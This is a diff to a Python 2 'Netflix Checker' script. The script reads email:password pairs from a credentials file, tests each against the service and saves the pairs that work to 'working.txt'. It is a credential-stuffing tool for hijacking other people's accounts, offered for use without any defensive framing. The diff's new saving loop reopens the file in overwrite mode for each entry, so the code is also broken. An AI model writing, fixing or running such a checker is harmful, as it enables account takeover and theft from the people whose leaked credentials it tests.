@@ -4,7 +4,6 @@
 archivo = "credenciales.txt"
 print "--------------------------[Netflix Checker by Taolano]--------------------------"
 try:
-	outfile = open('working.txt', 'w')
 	workingList = []
 	try:
 		import requests
@@ -27,6 +26,10 @@ try:
 		if validado == -1:
 			print"State: WORKING !","Email: "+email+" Password: "+password + "\n"
 			workingList.append(email +':'+ password) 
+			for all in workingList:
+				outfile = open('working.txt', 'w')
+				outfile.write(all)
+				outfile.close()
 
 		else:
 			print"State: not working" + "\n"
@@ -45,7 +48,4 @@ try:
 		password=lineas.split(":")[1]
 		checkPassword(email,password)
 except KeyboardInterrupt:
-   	 for all in workingList:
-		outfile.write(all)
-    	 sys.exit()
-	 outfile.close()
+	sys.exit()
